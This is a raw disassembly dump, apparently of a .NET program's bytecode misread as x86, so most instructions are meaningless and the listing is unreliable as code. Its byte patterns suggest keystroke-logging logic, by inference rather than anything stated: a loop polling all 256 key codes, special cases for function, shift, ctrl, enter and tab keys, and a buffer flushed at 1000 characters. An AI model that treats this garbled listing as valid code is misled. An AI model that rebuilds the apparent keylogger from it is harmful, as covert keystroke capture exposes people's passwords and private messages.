  405d6b:	0d 00 70 a2 00       	or     $0xa27000,%eax
  405d70:	11 07                	adc    %eax,(%edi)
  405d72:	17                   	pop    %ss
  405d73:	28 e4                	sub    %ah,%ah
  405d75:	00 00                	add    %al,(%eax)
  405d77:	0a 13                	or     (%ebx),%dl
  405d79:	06                   	push   %es
  405d7a:	12 06                	adc    (%esi),%al
  405d7c:	72 17                	jb     0x405d95
  405d7e:	0d 00 70 28 97       	or     $0x97287000,%eax
  405d83:	00 00                	add    %al,(%eax)
  405d85:	0a a2 00 11 07 18    	or     0x18071100(%edx),%ah
  405d8b:	09 6f e5             	or     %ebp,-0x1b(%edi)
  405d8e:	00 00                	add    %al,(%eax)
  405d90:	0a a2 00 11 07 19    	or     0x19071100(%edx),%ah
  405d96:	72 17                	jb     0x405daf
  405d98:	0b 00                	or     (%eax),%eax
  405d9a:	70 a2                	jo     0x405d3e
  405d9c:	00 11                	add    %dl,(%ecx)
  405d9e:	07                   	pop    %es
  405d9f:	1a 02                	sbb    (%edx),%al
  405da1:	7b 2c                	jnp    0x405dcf
  405da3:	00 00                	add    %al,(%eax)
  405da5:	04 a2                	add    $0xa2,%al
  405da7:	00 11                	add    %dl,(%ecx)
  405da9:	07                   	pop    %es
  405daa:	1b 72 2b             	sbb    0x2b(%edx),%esi
  405dad:	0d 00 70 a2 00       	or     $0xa27000,%eax
  405db2:	11 07                	adc    %eax,(%edi)
  405db4:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405db8:	0a 0a                	or     (%edx),%cl
  405dba:	de 2e                	fisubrs (%esi)
  405dbc:	00 de                	add    %bl,%dh
  405dbe:	22 25 28 2c 00 00    	and    0x2c28,%ah
  405dc4:	0a 13                	or     (%ebx),%dl
  405dc6:	05 00 11 05 28       	add    $0x28051100,%eax
  405dcb:	2c 00                	sub    $0x0,%al
  405dcd:	00 0a                	add    %cl,(%edx)
  405dcf:	00 11                	add    %dl,(%ecx)
  405dd1:	05 13 04 28 2d       	add    $0x2d280413,%eax
  405dd6:	00 00                	add    %al,(%eax)
  405dd8:	0a 00                	or     (%eax),%al
  405dda:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  405de0:	00 00                	add    %al,(%eax)
  405de2:	72 69                	jb     0x405e4d
  405de4:	00 00                	add    %al,(%eax)
  405de6:	70 0a                	jo     0x405df2
  405de8:	2b 00                	sub    (%eax),%eax
  405dea:	06                   	push   %es
  405deb:	2a 01                	sub    (%ecx),%al
  405ded:	10 00                	adc    %al,(%eax)
  405def:	00 00                	add    %al,(%eax)
  405df1:	00 02                	add    %al,(%edx)
  405df3:	00 cd                	add    %cl,%ch
  405df5:	cf                   	iret
  405df6:	00 22                	add    %ah,(%edx)
  405df8:	20 00                	and    %al,(%eax)
  405dfa:	00 01                	add    %al,(%ecx)
  405dfc:	1b 30                	sbb    (%eax),%esi
  405dfe:	03 00                	add    (%eax),%eax
  405e00:	52                   	push   %edx
  405e01:	02 00                	add    (%eax),%al
  405e03:	00 23                	add    %ah,(%ebx)
  405e05:	00 00                	add    %al,(%eax)
  405e07:	11 00                	adc    %eax,(%eax)
  405e09:	7e 10                	jle    0x405e1b
  405e0b:	00 00                	add    %al,(%eax)
  405e0d:	04 6f                	add    $0x6f,%al
  405e0f:	e6 00                	out    %al,$0x0
  405e11:	00 0a                	add    %cl,(%edx)
  405e13:	6f                   	outsl  %ds:(%esi),(%dx)
  405e14:	e7 00                	out    %eax,$0x0
  405e16:	00 0a                	add    %cl,(%edx)
  405e18:	0b 7e 10             	or     0x10(%esi),%edi
  405e1b:	00 00                	add    %al,(%eax)
  405e1d:	04 6f                	add    $0x6f,%al
  405e1f:	e6 00                	out    %al,$0x0
  405e21:	00 0a                	add    %cl,(%edx)
  405e23:	6f                   	outsl  %ds:(%esi),(%dx)
  405e24:	e8 00 00 0a 13       	call   0x134a5e29
  405e29:	07                   	pop    %es
  405e2a:	11 07                	adc    %eax,(%edi)
  405e2c:	2c 0f                	sub    $0xf,%al
  405e2e:	07                   	pop    %es
  405e2f:	13 08                	adc    (%eax),%ecx
  405e31:	11 08                	adc    %ecx,(%eax)
  405e33:	2c 04                	sub    $0x4,%al
  405e35:	16                   	push   %ss
  405e36:	0b 2b                	or     (%ebx),%ebp
  405e38:	03 00                	add    (%eax),%eax
  405e3a:	17                   	pop    %ss
  405e3b:	0b 00                	or     (%eax),%eax
  405e3d:	00 00                	add    %al,(%eax)
  405e3f:	00 03                	add    %al,(%ebx)
  405e41:	13 05 00 11 05 1f    	adc    0x1f051100,%eax
  405e47:	2e 2e 08 11          	cs or  %dl,%cs:(%ecx)
  405e4b:	05 1e 2e 03 16       	add    $0x16032e1e,%eax
  405e50:	2b 01                	sub    (%ecx),%eax
  405e52:	17                   	pop    %ss
  405e53:	13 08                	adc    (%eax),%ecx
  405e55:	11 08                	adc    %ecx,(%eax)
  405e57:	2c 25                	sub    $0x25,%al
  405e59:	72 33                	jb     0x405e8e
  405e5b:	0d 00 70 03 8c       	or     $0x8c037000,%eax
  405e60:	74 00                	je     0x405e62
  405e62:	00 01                	add    %al,(%ecx)
  405e64:	6f                   	outsl  %ds:(%esi),(%dx)
  405e65:	e9 00 00 0a 72       	jmp    0x724a5e6a
  405e6a:	37                   	aaa
  405e6b:	0d 00 70 28 43       	or     $0x43287000,%eax
  405e70:	00 00                	add    %al,(%eax)
  405e72:	0a 0a                	or     (%edx),%cl
  405e74:	dd df                	fstp   %st(7)
  405e76:	01 00                	add    %eax,(%eax)
  405e78:	00 38                	add    %bh,(%eax)
  405e7a:	51                   	push   %ecx
  405e7b:	01 00                	add    %eax,(%eax)
  405e7d:	00 00                	add    %al,(%eax)
  405e7f:	11 05 20 a0 00 00    	adc    %eax,0xa020
  405e85:	00 2e                	add    %ch,(%esi)
  405e87:	09 11                	or     %edx,(%ecx)
  405e89:	05 20 a1 00 00       	add    $0xa120,%eax
  405e8e:	00 33                	add    %dh,(%ebx)
  405e90:	02 2b                	add    (%ebx),%ch
  405e92:	09 11                	or     %edx,(%ecx)
  405e94:	05 20 00 00 01       	add    $0x1000020,%eax
  405e99:	00 33                	add    %dh,(%ebx)
  405e9b:	02 2b                	add    (%ebx),%ch
  405e9d:	06                   	push   %es
  405e9e:	11 05 1f 10 33 02    	adc    %eax,0x233101f
  405ea4:	2b 09                	sub    (%ecx),%ecx
  405ea6:	11 05 20 00 00 02    	adc    %eax,0x2000020
  405eac:	00 33                	add    %dh,(%ebx)
  405eae:	02 2b                	add    (%ebx),%ch
  405eb0:	06                   	push   %es
  405eb1:	11 05 1f 11 33 02    	adc    %eax,0x233111f
  405eb7:	2b 09                	sub    (%ecx),%ecx
  405eb9:	11 05 20 a3 00 00    	adc    %eax,0xa320
  405ebf:	00 33                	add    %dh,(%ebx)
  405ec1:	02 2b                	add    (%ebx),%ch
  405ec3:	09 11                	or     %edx,(%ecx)
  405ec5:	05 20 a2 00 00       	add    $0xa220,%eax
  405eca:	00 33                	add    %dh,(%ebx)
  405ecc:	02 2b                	add    (%ebx),%ch
  405ece:	09 11                	or     %edx,(%ecx)
  405ed0:	05 20 00 00 04       	add    $0x4000020,%eax
  405ed5:	00 33                	add    %dh,(%ebx)
  405ed7:	02 2b                	add    (%ebx),%ch
  405ed9:	06                   	push   %es
  405eda:	11 05 1f 70 33 02    	adc    %eax,0x233701f
  405ee0:	2b 06                	sub    (%esi),%eax
  405ee2:	11 05 1f 71 33 02    	adc    %eax,0x233711f
  405ee8:	2b 06                	sub    (%esi),%eax
  405eea:	11 05 1f 72 33 02    	adc    %eax,0x233721f
  405ef0:	2b 06                	sub    (%esi),%eax
  405ef2:	11 05 1f 73 33 02    	adc    %eax,0x233731f
  405ef8:	2b 06                	sub    (%esi),%eax
  405efa:	11 05 1f 74 33 02    	adc    %eax,0x233741f
  405f00:	2b 06                	sub    (%esi),%eax
  405f02:	11 05 1f 75 33 02    	adc    %eax,0x233751f
  405f08:	2b 06                	sub    (%esi),%eax
  405f0a:	11 05 1f 76 33 02    	adc    %eax,0x233761f
  405f10:	2b 06                	sub    (%esi),%eax
  405f12:	11 05 1f 77 33 02    	adc    %eax,0x233771f
  405f18:	2b 06                	sub    (%esi),%eax
  405f1a:	11 05 1f 78 33 02    	adc    %eax,0x233781f
  405f20:	2b 06                	sub    (%esi),%eax
  405f22:	11 05 1f 79 33 02    	adc    %eax,0x233791f
  405f28:	2b 06                	sub    (%esi),%eax
  405f2a:	11 05 1f 7a 33 02    	adc    %eax,0x2337a1f
  405f30:	2b 06                	sub    (%esi),%eax
  405f32:	11 05 1f 7b 33 02    	adc    %eax,0x2337b1f
  405f38:	2b 09                	sub    (%ecx),%ecx
  405f3a:	11 05 1f 23 2e 03    	adc    %eax,0x32e231f
  405f40:	16                   	push   %ss
  405f41:	2b 01                	sub    (%ecx),%eax
  405f43:	17                   	pop    %ss
  405f44:	13 08                	adc    (%eax),%ecx
  405f46:	11 08                	adc    %ecx,(%eax)
  405f48:	2c 0d                	sub    $0xd,%al
  405f4a:	72 69                	jb     0x405fb5
  405f4c:	00 00                	add    %al,(%eax)
  405f4e:	70 0a                	jo     0x405f5a
  405f50:	dd 03                	fldl   (%ebx)
  405f52:	01 00                	add    %eax,(%eax)
  405f54:	00 2b                	add    %ch,(%ebx)
  405f56:	78 00                	js     0x405f58
  405f58:	11 05 1f 20 fe 01    	adc    %eax,0x1fe201f
  405f5e:	13 08                	adc    (%eax),%ecx
  405f60:	11 08                	adc    %ecx,(%eax)
  405f62:	2c 0d                	sub    $0xd,%al
  405f64:	72 17                	jb     0x405f7d
  405f66:	0b 00                	or     (%eax),%eax
  405f68:	70 0a                	jo     0x405f74
  405f6a:	dd e9                	fucomp %st(1)
  405f6c:	00 00                	add    %al,(%eax)
  405f6e:	00 2b                	add    %ch,(%ebx)
  405f70:	5e                   	pop    %esi
  405f71:	00 11                	add    %dl,(%ecx)
  405f73:	05 1f 0d 2e 09       	add    $0x92e0d1f,%eax
  405f78:	11 05 1f 0d 2e 03    	adc    %eax,0x32e0d1f
  405f7e:	16                   	push   %ss
  405f7f:	2b 01                	sub    (%ecx),%eax
  405f81:	17                   	pop    %ss
  405f82:	13 08                	adc    (%eax),%ecx
  405f84:	11 08                	adc    %ecx,(%eax)
  405f86:	2c 2f                	sub    $0x2f,%al
  405f88:	02 7b 2f             	add    0x2f(%ebx),%bh
  405f8b:	00 00                	add    %al,(%eax)
  405f8d:	04 72                	add    $0x72,%al
  405f8f:	3b 0d 00 70 6f c4    	cmp    0xc46f7000,%ecx
  405f95:	00 00                	add    %al,(%eax)
  405f97:	0a 13                	or     (%ebx),%dl
  405f99:	07                   	pop    %es
  405f9a:	11 07                	adc    %eax,(%edi)
  405f9c:	2c 0b                	sub    $0xb,%al
  405f9e:	72 69                	jb     0x406009
  405fa0:	00 00                	add    %al,(%eax)
  405fa2:	70 0a                	jo     0x405fae
  405fa4:	dd af 00 00 00 00    	(bad) 0x0(%edi)
  405faa:	72 3b                	jb     0x405fe7
  405fac:	0d 00 70 0a dd       	or     $0xdd0a7000,%eax
  405fb1:	a3 00 00 00 2b       	mov    %eax,0x2b000000
  405fb6:	18 00                	sbb    %al,(%eax)
  405fb8:	11 05 1f 09 fe 01    	adc    %eax,0x1fe091f
  405fbe:	13 08                	adc    (%eax),%ecx
  405fc0:	11 08                	adc    %ecx,(%eax)
  405fc2:	2c 0b                	sub    $0xb,%al
  405fc4:	72 4f                	jb     0x406015
  405fc6:	0d 00 70 0a dd       	or     $0xdd0a7000,%eax
  405fcb:	89 00                	mov    %eax,(%eax)
  405fcd:	00 00                	add    %al,(%eax)
  405fcf:	00 07                	add    %al,(%edi)
  405fd1:	13 08                	adc    (%eax),%ecx
  405fd3:	11 08                	adc    %ecx,(%eax)
  405fd5:	2c 0f                	sub    $0xf,%al
  405fd7:	03 b8 28 47 00 00    	add    0x4728(%eax),%edi
  405fdd:	06                   	push   %es
  405fde:	6f                   	outsl  %ds:(%esi),(%dx)
  405fdf:	ea 00 00 0a 0a de 72 	ljmp   $0x72de,$0xa0a0000
  405fe6:	00 03                	add    %al,(%ebx)
  405fe8:	b8 28 47 00 00       	mov    $0x4728,%eax
  405fed:	06                   	push   %es
  405fee:	0c de                	or     $0xde,%al
  405ff0:	62 25 28 2c 00 00    	bound  %esp,0x2c28
  405ff6:	0a 13                	or     (%ebx),%dl
  405ff8:	04 00                	add    $0x0,%al
  405ffa:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  405ffd:	2c 00                	sub    $0x0,%al
  405fff:	00 0a                	add    %cl,(%edx)
  406001:	00 11                	add    %dl,(%ecx)
  406003:	04 0d                	add    $0xd,%al
  406005:	07                   	pop    %es
  406006:	13 08                	adc    (%eax),%ecx
  406008:	11 08                	adc    %ecx,(%eax)
  40600a:	2c 24                	sub    $0x24,%al
  40600c:	03 28                	add    (%eax),%ebp
  40600e:	cd 00                	int    $0x0
  406010:	00 0a                	add    %cl,(%edx)
  406012:	13 06                	adc    (%esi),%eax
  406014:	12 06                	adc    (%esi),%al
  406016:	28 ce                	sub    %cl,%dh
  406018:	00 00                	add    %al,(%eax)
  40601a:	0a 6f ea             	or     -0x16(%edi),%ch
  40601d:	00 00                	add    %al,(%eax)
  40601f:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  406022:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  406027:	08 0a                	or     %cl,(%edx)
  406029:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40602f:	28 00                	sub    %al,(%eax)
  406031:	03 28                	add    (%eax),%ebp
  406033:	cd 00                	int    $0x0
  406035:	00 0a                	add    %cl,(%edx)
  406037:	13 06                	adc    (%esi),%eax
  406039:	12 06                	adc    (%esi),%al
  40603b:	28 ce                	sub    %cl,%dh
  40603d:	00 00                	add    %al,(%eax)
  40603f:	0a 6f 31             	or     0x31(%edi),%ch
  406042:	00 00                	add    %al,(%eax)
  406044:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  406047:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40604c:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  406052:	00 00                	add    %al,(%eax)
  406054:	08 0a                	or     %cl,(%edx)
  406056:	2b 00                	sub    (%eax),%eax
  406058:	06                   	push   %es
  406059:	2a 00                	sub    (%eax),%al
  40605b:	00 41 1c             	add    %al,0x1c(%ecx)
  40605e:	00 00                	add    %al,(%eax)
  406060:	00 00                	add    %al,(%eax)
  406062:	00 00                	add    %al,(%eax)
  406064:	37                   	aaa
  406065:	00 00                	add    %al,(%eax)
  406067:	00 b2 01 00 00 e9    	add    %dh,-0x16ffffff(%edx)
  40606d:	01 00                	add    %eax,(%eax)
  40606f:	00 62 00             	add    %ah,0x0(%edx)
  406072:	00 00                	add    %al,(%eax)
  406074:	20 00                	and    %al,(%eax)
  406076:	00 01                	add    %al,(%ecx)
  406078:	1b 30                	sbb    (%eax),%esi
  40607a:	07                   	pop    %es
  40607b:	00 9b 00 00 00 24    	add    %bl,0x24000000(%ebx)
  406081:	00 00                	add    %al,(%eax)
  406083:	11 00                	adc    %eax,(%eax)
  406085:	00 73 eb             	add    %dh,-0x15(%ebx)
  406088:	00 00                	add    %al,(%eax)
  40608a:	0a 0d 20 ff 00 00    	or     0xff20,%cl
  406090:	00 8d 1c 00 00 01    	add    %cl,0x100001c(%ebp)
  406096:	0c 08                	or     $0x8,%al
  406098:	28 43 00             	sub    %al,0x0(%ebx)
  40609b:	00 06                	add    %al,(%esi)
  40609d:	16                   	push   %ss
  40609e:	fe 01                	incb   (%ecx)
  4060a0:	13 08                	adc    (%eax),%ecx
  4060a2:	11 08                	adc    %ecx,(%eax)
  4060a4:	2c 08                	sub    $0x8,%al
  4060a6:	72 69                	jb     0x406111
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	70 0a                	jo     0x4060b6
  4060ac:	de 6f 00             	fisubrs 0x0(%edi)
  4060af:	02 16                	add    (%esi),%dl
  4060b1:	28 45 00             	sub    %al,0x0(%ebp)
  4060b4:	00 06                	add    %al,(%esi)
  4060b6:	0b 16                	or     (%esi),%edx
  4060b8:	13 05 28 1a 00 00    	adc    0x1a28,%eax
  4060be:	06                   	push   %es
  4060bf:	12 05 28 44 00 00    	adc    0x4428,%al
  4060c5:	06                   	push   %es
  4060c6:	28 42 00             	sub    %al,0x0(%edx)
  4060c9:	00 06                	add    %al,(%esi)
  4060cb:	28 ba 00 00 0a 13    	sub    %bh,0x130a0000(%edx)
  4060d1:	04 02                	add    $0x2,%al
  4060d3:	07                   	pop    %es
  4060d4:	08 09                	or     %cl,(%ecx)
  4060d6:	1b 16                	sbb    (%esi),%edx
  4060d8:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4060db:	46                   	inc    %esi
  4060dc:	00 00                	add    %al,(%eax)
  4060de:	06                   	push   %es
  4060df:	26 09 6f ec          	or     %ebp,%es:-0x14(%edi)
  4060e3:	00 00                	add    %al,(%eax)
  4060e5:	0a 0a                	or     (%edx),%cl
  4060e7:	de 34 de             	fidivs (%esi,%ebx,8)
  4060ea:	22 25 28 2c 00 00    	and    0x2c28,%ah
  4060f0:	0a 13                	or     (%ebx),%dl
  4060f2:	07                   	pop    %es
  4060f3:	00 11                	add    %dl,(%ecx)
  4060f5:	07                   	pop    %es
  4060f6:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4060f9:	00 0a                	add    %cl,(%edx)
  4060fb:	00 11                	add    %dl,(%ecx)
  4060fd:	07                   	pop    %es
  4060fe:	13 06                	adc    (%esi),%eax
  406100:	28 2d 00 00 0a 00    	sub    %ch,0xa0000
  406106:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40610c:	00 00                	add    %al,(%eax)
  40610e:	02 84 8c 74 00 00 01 	add    0x1000074(%esp,%ecx,4),%al
  406115:	6f                   	outsl  %ds:(%esi),(%dx)
  406116:	e9 00 00 0a 0a       	jmp    0xa4a611b
  40611b:	2b 00                	sub    (%eax),%eax
  40611d:	06                   	push   %es
  40611e:	2a 00                	sub    (%eax),%al
  406120:	01 10                	add    %edx,(%eax)
  406122:	00 00                	add    %al,(%eax)
  406124:	00 00                	add    %al,(%eax)
  406126:	02 00                	add    (%eax),%al
  406128:	65 67 00 22          	add    %ah,%gs:(%bp,%si)
  40612c:	20 00                	and    %al,(%eax)
  40612e:	00 01                	add    %al,(%ecx)
  406130:	1b 30                	sbb    (%eax),%esi
  406132:	05 00 3f 01 00       	add    $0x13f00,%eax
  406137:	00 25 00 00 11 00    	add    %ah,0x110000
  40613d:	02 02                	add    (%edx),%al
  40613f:	7b 30                	jnp    0x406171
  406141:	00 00                	add    %al,(%eax)
  406143:	04 72                	add    $0x72,%al
  406145:	69 00 00 70 28 25    	imul   $0x25287000,(%eax),%eax
  40614b:	00 00                	add    %al,(%eax)
  40614d:	06                   	push   %es
  40614e:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  406151:	00 0a                	add    %cl,(%edx)
  406153:	28 22                	sub    %ah,(%edx)
  406155:	00 00                	add    %al,(%eax)
  406157:	0a 7d 2f             	or     0x2f(%ebp),%bh
  40615a:	00 00                	add    %al,(%eax)
  40615c:	04 00                	add    $0x0,%al
  40615e:	00 00                	add    %al,(%eax)
  406160:	17                   	pop    %ss
  406161:	0a 16                	or     (%esi),%dl
  406163:	0b 00                	or     (%eax),%eax
  406165:	07                   	pop    %es
  406166:	28 41 00             	sub    %al,0x0(%ecx)
  406169:	00 06                	add    %al,(%esi)
  40616b:	20 01                	and    %al,(%ecx)
  40616d:	80 ff ff             	cmp    $0xff,%bh
  406170:	fe 01                	incb   (%ecx)
  406172:	7e 10                	jle    0x406184
  406174:	00 00                	add    %al,(%eax)
  406176:	04 6f                	add    $0x6f,%al
  406178:	e6 00                	out    %al,$0x0
  40617a:	00 0a                	add    %cl,(%edx)
  40617c:	6f                   	outsl  %ds:(%esi),(%dx)
  40617d:	ed                   	in     (%dx),%eax
  40617e:	00 00                	add    %al,(%eax)
  406180:	0a 16                	or     (%esi),%dl
  406182:	fe 01                	incb   (%ecx)
  406184:	5f                   	pop    %edi
  406185:	13 06                	adc    (%esi),%eax
  406187:	11 06                	adc    %eax,(%esi)
  406189:	2c 4a                	sub    $0x4a,%al
  40618b:	07                   	pop    %es
  40618c:	0c 02                	or     $0x2,%al
  40618e:	08 6f 40             	or     %ch,0x40(%edi)
  406191:	00 00                	add    %al,(%eax)
  406193:	06                   	push   %es
  406194:	0d 09 6f 2b 00       	or     $0x2b6f09,%eax
  406199:	00 0a                	add    %cl,(%edx)
  40619b:	16                   	push   %ss
  40619c:	fe 02                	incb   (%edx)
  40619e:	13 06                	adc    (%esi),%eax
  4061a0:	11 06                	adc    %eax,(%esi)
  4061a2:	2c 29                	sub    $0x29,%al
  4061a4:	02 02                	add    (%edx),%al
  4061a6:	7b 2f                	jnp    0x4061d7
  4061a8:	00 00                	add    %al,(%eax)
  4061aa:	04 02                	add    $0x2,%al
  4061ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4061ad:	3f                   	aas
  4061ae:	00 00                	add    %al,(%eax)
  4061b0:	06                   	push   %es
  4061b1:	28 4a 00             	sub    %cl,0x0(%edx)
  4061b4:	00 0a                	add    %cl,(%edx)
  4061b6:	7d 2f                	jge    0x4061e7
  4061b8:	00 00                	add    %al,(%eax)
  4061ba:	04 02                	add    $0x2,%al
  4061bc:	02 7b 2f             	add    0x2f(%ebx),%bh
  4061bf:	00 00                	add    %al,(%eax)
  4061c1:	04 09                	add    $0x9,%al
  4061c3:	28 4a 00             	sub    %cl,0x0(%edx)
  4061c6:	00 0a                	add    %cl,(%edx)
  4061c8:	7d 2f                	jge    0x4061f9
  4061ca:	00 00                	add    %al,(%eax)
  4061cc:	04 00                	add    $0x0,%al
  4061ce:	02 08                	add    (%eax),%cl
  4061d0:	7d 2e                	jge    0x406200
  4061d2:	00 00                	add    %al,(%eax)
  4061d4:	04 00                	add    $0x0,%al
  4061d6:	07                   	pop    %es
  4061d7:	17                   	pop    %ss
  4061d8:	d6                   	salc
  4061d9:	0b 07                	or     (%edi),%eax
  4061db:	20 ff                	and    %bh,%bh
  4061dd:	00 00                	add    %al,(%eax)
  4061df:	00 fe                	add    %bh,%dh
  4061e1:	02 16                	add    (%esi),%dl
  4061e3:	fe 01                	incb   (%ecx)
  4061e5:	13 06                	adc    (%esi),%eax
  4061e7:	11 06                	adc    %eax,(%esi)
  4061e9:	3a 77 ff             	cmp    -0x1(%edi),%dh
  4061ec:	ff                   	(bad)
  4061ed:	ff 06                	incl   (%esi)
  4061ef:	20 e8                	and    %ch,%al
  4061f1:	03 00                	add    (%eax),%eax
  4061f3:	00 fe                	add    %bh,%dh
  4061f5:	01 13                	add    %edx,(%ebx)
  4061f7:	06                   	push   %es
  4061f8:	11 06                	adc    %eax,(%esi)
  4061fa:	2c 5d                	sub    $0x5d,%al
  4061fc:	16                   	push   %ss
  4061fd:	0a 72 13             	or     0x13(%edx),%dh
  406200:	01 00                	add    %eax,(%eax)
  406202:	70 28                	jo     0x40622c
  406204:	40                   	inc    %eax
  406205:	00 00                	add    %al,(%eax)
  406207:	0a 20                	or     (%eax),%ah
  406209:	00 04 00             	add    %al,(%eax,%eax,1)
  40620c:	00 d8                	add    %bl,%al
  40620e:	13 04 02             	adc    (%edx,%eax,1),%eax
  406211:	7b 2f                	jnp    0x406242
  406213:	00 00                	add    %al,(%eax)
  406215:	04 6f                	add    $0x6f,%al
  406217:	2b 00                	sub    (%eax),%eax
  406219:	00 0a                	add    %cl,(%edx)
  40621b:	11 04 fe             	adc    %eax,(%esi,%edi,8)
  40621e:	02 13                	add    (%ebx),%dl
  406220:	06                   	push   %es
  406221:	11 06                	adc    %eax,(%esi)
  406223:	2c 20                	sub    $0x20,%al
  406225:	02 02                	add    (%edx),%al
  406227:	7b 2f                	jnp    0x406258
  406229:	00 00                	add    %al,(%eax)
  40622b:	04 16                	add    $0x16,%al
  40622d:	02 7b 2f             	add    0x2f(%ebx),%bh
  406230:	00 00                	add    %al,(%eax)
  406232:	04 6f                	add    $0x6f,%al
  406234:	2b 00                	sub    (%eax),%eax
  406236:	00 0a                	add    %cl,(%edx)
  406238:	11 04 da             	adc    %eax,(%edx,%ebx,8)
  40623b:	6f                   	outsl  %ds:(%esi),(%dx)
  40623c:	ee                   	out    %al,(%dx)
  40623d:	00 00                	add    %al,(%eax)
  40623f:	0a 7d 2f             	or     0x2f(%ebp),%bh
  406242:	00 00                	add    %al,(%eax)
  406244:	04 00                	add    $0x0,%al
  406246:	02 7b 30             	add    0x30(%ebx),%bh
  406249:	00 00                	add    %al,(%eax)
  40624b:	04 02                	add    $0x2,%al
  40624d:	7b 2f                	jnp    0x40627e
  40624f:	00 00                	add    %al,(%eax)
  406251:	04 17                	add    $0x17,%al
  406253:	28 3b                	sub    %bh,(%ebx)
  406255:	00 00                	add    %al,(%eax)
  406257:	06                   	push   %es
  406258:	26 00 17             	add    %dl,%es:(%edi)
  40625b:	28 36                	sub    %dh,(%esi)
  40625d:	00 00                	add    %al,(%eax)
  40625f:	0a 00                	or     (%eax),%al
  406261:	38 f9                	cmp    %bh,%cl
  406263:	fe                   	(bad)
  406264:	ff                   	(bad)
  406265:	ff                   	lcall  (bad)
  406266:	de 10                	ficoms (%eax)
  406268:	25 28 2c 00 00       	and    $0x2c28,%eax
  40626d:	0a 13                	or     (%ebx),%dl
  40626f:	05 00 28 2d 00       	add    $0x2d2800,%eax
  406274:	00 0a                	add    %cl,(%edx)
  406276:	de 00                	fiadds (%eax)
  406278:	00 00                	add    %al,(%eax)
  40627a:	2a 00                	sub    (%eax),%al
  40627c:	41                   	inc    %ecx
  40627d:	1c 00                	sbb    $0x0,%al
  40627f:	00 00                	add    %al,(%eax)
  406281:	00 00                	add    %al,(%eax)
  406283:	00 22                	add    %ah,(%edx)
  406285:	00 00                	add    %al,(%eax)
  406287:	00 0a                	add    %cl,(%edx)
  406289:	01 00                	add    %eax,(%eax)
  40628b:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  40628e:	00 00                	add    %al,(%eax)
  406290:	10 00                	adc    %al,(%eax)
  406292:	00 00                	add    %al,(%eax)
  406294:	20 00                	and    %al,(%eax)
  406296:	00 01                	add    %al,(%ecx)
  406298:	52                   	push   %edx
  406299:	02 28                	add    (%eax),%ch
  40629b:	12 00                	adc    (%eax),%al
  40629d:	00 0a                	add    %cl,(%edx)
  40629f:	00 02                	add    %al,(%edx)
  4062a1:	73 ef                	jae    0x406292
  4062a3:	00 00                	add    %al,(%eax)
  4062a5:	0a 7d 31             	or     0x31(%ebp),%bh
  4062a8:	00 00                	add    %al,(%eax)
  4062aa:	04 00                	add    $0x0,%al
  4062ac:	2a 00                	sub    (%eax),%al
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	13 30                	adc    (%eax),%esi
  4062b2:	02 00                	add    (%eax),%al
  4062b4:	19 00                	sbb    %eax,(%eax)
  4062b6:	00 00                	add    %al,(%eax)
  4062b8:	05 00 00 11 00       	add    $0x110000,%eax
  4062bd:	02 7b 31             	add    0x31(%ebx),%bh
  4062c0:	00 00                	add    %al,(%eax)
  4062c2:	04 03                	add    $0x3,%al
  4062c4:	28 ba 00 00 0a 6f    	sub    %bh,0x6f0a0000(%edx)
  4062ca:	f0 00 00             	lock add %al,(%eax)
  4062cd:	0a 00                	or     (%eax),%al
  4062cf:	17                   	pop    %ss
  4062d0:	0a 2b                	or     (%ebx),%ch
  4062d2:	00 06                	add    %al,(%esi)
  4062d4:	2a 00                	sub    (%eax),%al
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	13 30                	adc    (%eax),%esi
  4062da:	04 00                	add    $0x0,%al
  4062dc:	4d                   	dec    %ebp
  4062dd:	02 00                	add    (%eax),%al
  4062df:	00 26                	add    %ah,(%esi)
  4062e1:	00 00                	add    %al,(%eax)
  4062e3:	11 00                	adc    %eax,(%eax)
  4062e5:	38 3b                	cmp    %bh,(%ebx)
  4062e7:	02 00                	add    (%eax),%al
  4062e9:	00 20                	add    %ah,(%eax)
  4062eb:	c8 00 00 00          	enter  $0x0,$0x0
  4062ef:	28 36                	sub    %dh,(%esi)
  4062f1:	00 00                	add    %al,(%eax)
  4062f3:	0a 00                	or     (%eax),%al
  4062f5:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  4062f9:	06                   	push   %es
  4062fa:	0a 12                	or     (%edx),%dl
  4062fc:	00 28                	add    %ch,(%eax)
  4062fe:	e2 00                	loop   0x406300
  406300:	00 0a                	add    %cl,(%edx)
  406302:	16                   	push   %ss
  406303:	fe 01                	incb   (%ecx)
  406305:	13 0f                	adc    (%edi),%ecx
  406307:	11 0f                	adc    %ecx,(%edi)
  406309:	2c 05                	sub    $0x5,%al
  40630b:	38 15 02 00 00 16    	cmp    %dl,0x16000002
  406311:	0b 06                	or     (%esi),%eax
  406313:	12 01                	adc    (%ecx),%al
  406315:	28 4b 00             	sub    %cl,0x0(%ebx)
  406318:	00 06                	add    %al,(%esi)
  40631a:	26 07                	es pop %es
  40631c:	16                   	push   %ss
  40631d:	fe 02                	incb   (%edx)
  40631f:	13 0f                	adc    (%edi),%ecx
  406321:	11 0f                	adc    %ecx,(%edi)
  406323:	39 fb                	cmp    %edi,%ebx
  406325:	01 00                	add    %eax,(%eax)
  406327:	00 72 69             	add    %dh,0x69(%edx)
  40632a:	00 00                	add    %al,(%eax)
  40632c:	70 13                	jo     0x406341
  40632e:	04 06                	add    $0x6,%al
  406330:	28 f1                	sub    %dh,%cl
  406332:	00 00                	add    %al,(%eax)
  406334:	0a 28                	or     (%eax),%ch
  406336:	50                   	push   %eax
  406337:	00 00                	add    %al,(%eax)
  406339:	06                   	push   %es
